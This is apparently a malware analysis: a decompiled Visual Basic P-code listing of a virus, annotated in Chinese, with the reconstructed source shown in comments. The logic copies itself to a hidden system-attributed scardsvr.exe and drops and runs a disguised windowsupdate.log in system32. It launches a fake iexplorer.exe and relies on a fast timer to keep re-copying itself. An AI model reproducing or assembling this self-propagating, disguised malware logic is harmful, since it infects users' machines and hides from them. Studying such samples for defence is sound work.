
```vb
;SetAttr %system32%\scardsvr.exe,vbHidden Or vbSystem Or vbReadOnly  

000053C3:  FBEF ConcatVar  

000053C7:  25   PopAdLdVar  

000053C8:  04   FLdRfVar var_E0  

000053CB:  FF42 VarLateMemCallLdVar  

000053D3:  04   FLdRfVar var_FC  

000053D6:  FE4E SetVarVarFunc  

000053D8:  36   FFreeVar var_9C var_AC  

000053DF:  00   LargeBos  

000053E1:  28   LitVarI2: 7 0x7 var_CC  

000053E6:  25   PopAdLdVar  

000053E7:  04   FLdRfVar var_FC  

000053EA:  FF43 VarLateMemSt  

000053EE:  00   LargeBos  

000053F0:  04   FLdRfVar szIE  

000053F3:  04   FLdRfVar var_88  

000053F6:  05   ImpAdLdRf  

000053F9:  24   NewIfNullPr  

000053FC:  0D   VCallHresult Global.Get_App() As App  

00005401:  08   FLdPr var_88  

00005404:  0D   VCallHresult App.Get_Path()  

00005409:  28   LitVarI2: 1 0x1 var_CC  

0000540E:  25   PopAdLdVar  

0000540F:  04   FLdRfVar var_E0  

00005412:  FF42 VarLateMemCallLdVar  

0000541A:  FC8B PopAd  

0000541C:  F5   LitI4: 7 0x7  

00005421:  6C   ILdRf szIE  

00005424:  1B   LitStr: "\\systemcheck.log"    ;当前目录下的 systemcheck.log 文件存在，  
则复制该文件至%system32%\windowsupdate.log,然后运行复制后的文件.  

00005427:  2A   ConcatStr  

00005428:  46   CVarStr var_9C  

0000542B:  0B   ImpAdCallI2 Dir()  

00005430:  23   FStStrNoPop var_D0  

00005433:  1B   LitStr: ""  

00005436:  FB3D NeStr <>  

00005438:  F5   LitI4: 7 0x7  

0000543D:  04   FLdRfVar var_AC  

00005440:  3A   LitVarStr: "\\windowsupdate.log"  

00005445:  FBEF ConcatVar  

00005449:  0B   ImpAdCallI2 Dir()  

0000544E:  23   FStStrNoPop var_E8  

00005451:  1B   LitStr: ""  

00005454:  FB30 EqStr =  

00005456:  C4   AndI4 And  

00005457:  32   FFreeStr szIE var_D0 var_E8  

00005460:  1A   FFree1Ad var_88  

00005463:  36   FFreeVar var_9C var_AC var_144  

0000546C:  1C   BranchF   00005555  

0000546F:  00   LargeBos  

00005471:  04   FLdRfVar szIE  

00005474:  04   FLdRfVar var_88  

00005477:  05   ImpAdLdRf  

0000547A:  24   NewIfNullPr  

0000547D:  0D   VCallHresult Global.Get_App() As App  

00005482:  08   FLdPr var_88  

00005485:  0D   VCallHresult App.Get_Path()  

0000548A:  6C   ILdRf szIE  

0000548D:  1B   LitStr: "\\systemcheck.log"  

00005490:  2A   ConcatStr  

00005491:  46   CVarStr var_9C  

00005494:  25   PopAdLdVar  

00005495:  04   FLdRfVar var_E0  

00005498:  FF42 VarLateMemCallLdVar  

000054A0:  04   FLdRfVar var_FC  

000054A3:  FE4E SetVarVarFunc  

000054A5:  2F   FFree1Str szIE  

000054A8:  1A   FFree1Ad var_88  

000054AB:  35   FFree1Var var_9C  

000054AE:  00   LargeBos  

000054B0:  28   LitVarI2: 1 0x1 var_CC  

000054B5:  25   PopAdLdVar  

000054B6:  04   FLdRfVar var_E0  

000054B9:  FF42 VarLateMemCallLdVar  

000054C1:  3A   LitVarStr: "\\windowsupdate.log"  

000054C6:  FBEF ConcatVar  

000054CA:  25   PopAdLdVar  

000054CB:  04   FLdRfVar var_FC  

000054CE:  FD9F LdPrVar  

000054D0:  FE98 LateMemCall  

000054D6:  36   FFreeVar var_9C var_AC  

000054DD:  00   LargeBos  

000054DF:  28   LitVarI2: 1 0x1 var_CC  

000054E4:  25   PopAdLdVar  

000054E5:  04   FLdRfVar var_E0  

000054E8:  FF42 VarLateMemCallLdVar  

000054F0:  3A   LitVarStr: "\\windowsupdate.log"  

000054F5:  FBEF ConcatVar  

000054F9:  25   PopAdLdVar  

000054FA:  04   FLdRfVar var_E0  

000054FD:  FF42 VarLateMemCallLdVar  

00005505:  04   FLdRfVar var_FC  

00005508:  FE4E SetVarVarFunc  

0000550A:  36   FFreeVar var_9C var_AC  

00005511:  00   LargeBos  

00005513:  28   LitVarI2: 7 0x7 var_CC  

00005518:  25   PopAdLdVar  

00005519:  04   FLdRfVar var_FC  

0000551C:  FF43 VarLateMemSt  

00005520:  00   LargeBos  

00005522:  28   LitVarI2: 1 0x1 var_CC  

00005527:  25   PopAdLdVar  

00005528:  04   FLdRfVar var_E0  

0000552B:  FF42 VarLateMemCallLdVar  

00005533:  FC8B PopAd  

00005535:  F5   LitI4: 0 0x0  

0000553A:  04   FLdRfVar var_9C  

0000553D:  3A   LitVarStr: "\\windowsupdate.log"  

00005542:  FBEF ConcatVar  

00005546:  0A   ImpAdCallFPR4 Shell()  

0000554B:  74   FStFPR8  

0000554E:  36   FFreeVar var_9C var_AC  

; if dir(app.path & "\\systemcheck.log") <> "" and dir(%system32% & "\\windowsupdate.log")= "" then  
;   CopyFile app.path & "\\systemcheck.log", %system32%\windowsupdate.log  
;   shell %system32%\windowsupdate.log  
; end if  

00005555:   

00005555:  00   LargeBos  

00005557:  00   LargeBos  

00005559:  28   LitVarI2: 1 0x1 var_CC  

0000555E:  25   PopAdLdVar  

0000555F:  04   FLdRfVar var_E0  

00005562:  FF42 VarLateMemCallLdVar  

0000556A:  FC8B PopAd  

0000556C:  F5   LitI4: 0 0x0  

00005571:  04   FLdRfVar var_9C  

00005574:  3A   LitVarStr: "\\iexplorer.exe"    ;运行系统目录下的 iexplorer.exe 文件  

00005579:  FBEF ConcatVar  

0000557D:  0A   ImpAdCallFPR4 Shell()  

00005582:  74   FStFPR8  

00005585:  36   FFreeVar var_9C var_AC  

; shell %system32%\iexplorer.exe  

ShellExplorer:  

0000558E:  00   LargeBos  

00005590:  04   FLdRfVar szIE  

00005593:  04   FLdRfVar var_88  

00005596:  05   ImpAdLdRf  

00005599:  24   NewIfNullPr  

0000559C:  0D   VCallHresult Global.Get_App() As App  

000055A1:  08   FLdPr var_88  

000055A4:  0D   VCallHresult App.Get_Path()  

000055A9:  F5   LitI4: 3 0x3  

000055AE:  3E   FLdZeroAd szIE  

000055B1:  46   CVarStr var_9C  

000055B4:  04   FLdRfVar var_AC  

000055B7:  0A   ImpAdCallFPR4 Left()  

000055BC:  F5   LitI4: 1 0x1  

000055C1:  3A   LitVarStr: "explorer "  

000055C6:  04   FLdRfVar var_AC  

000055C9:  FBEF ConcatVar  

000055CD:  0A   ImpAdCallFPR4 Shell()  ;打开资源管理器,打开路径为当前病毒所在的根目录  

000055D2:  74   FStFPR8  

000055D5:  1A   FFree1Ad var_88  

000055D8:  36   FFreeVar var_9C var_AC var_144  

; shell "explorer " & left$(app.path,3)  

SubMain_ExitSub:  

000055E1:  00   LargeBos  

000055E3:  00   LargeBos  

000055E5:  14   ExitProc  

; Exit sub  

End Sub  


Private Sub Form_Load()  
000046D0:  F4   LitI2_Byte: 255 0xFF (True)  

000046D2:  21   FLdPrThis  

000046D3:  0F   VCallAd  

000046D6:  19   FStAdFunc var_88  

000046D9:  08   FLdPr var_88  

000046DC:  0D   VCallHresult Timer.Set_Enabled()  

000046E1:  1A   FFree1Ad var_88  

000046E4:  13   ExitProcHresult  

; Timer1.InterVal = 255    ;设置时间控件的时间间隔  
; Timer1.Enabled = true    ;激活时间控件  
; Exit sub  

End Sub  


Private Sub Timer1_Timer()  
0000471C:  00   LargeBos  

0000471E:  00   LargeBos  

00004720:  4B   OnErrorGoto  

00004723:  00   LargeBos  

00004725:  04   FLdRfVar szIE  

00004728:  04   FLdRfVar var_88  

0000472B:  05   ImpAdLdRf  

0000472E:  24   NewIfNullPr  

00004731:  0D   VCallHresult Global.Get_App() As App  

00004736:  08   FLdPr var_88  

00004739:  0D   VCallHresult App.Get_Path()    ;先判断病毒当前目录下的 scardsvr.exe 文件是否存在,  
不存在则复制病毒体本身为该文件  

0000473E:  F5   LitI4: 7 0x7  

00004743:  6C   ILdRf szIE  

00004746:  1B   LitStr: "\\scardsvr.exe"  

00004749:  2A   ConcatStr  

0000474A:  46   CVarStr var_9C  

0000474D:  0B   ImpAdCallI2 Dir()  

00004752:  23   FStStrNoPop var_A0  

00004755:  1B   LitStr: ""  

00004758:  FB30 EqStr =  

0000475A:  32   FFreeStr szIE var_A0  

00004761:  1A   FFree1Ad var_88  

00004764:  35   FFree1Var var_9C  

00004767:  1C   BranchF   0000487E  

0000476A:  00   LargeBos  

0000476C:  F5   LitI4: 0 0x0  

00004771:  1B   LitStr: "Scripting.FileSystemObject"  

00004774:  04   FLdRfVar var_9C  

00004777:  0A   ImpAdCallFPR4 rtcCreateObject2  

0000477C:  04   FLdRfVar var_9C  

0000477F:  04   FLdRfVar var_B0  

00004782:  FE4E SetVarVarFunc  

00004784:  00   LargeBos  
```
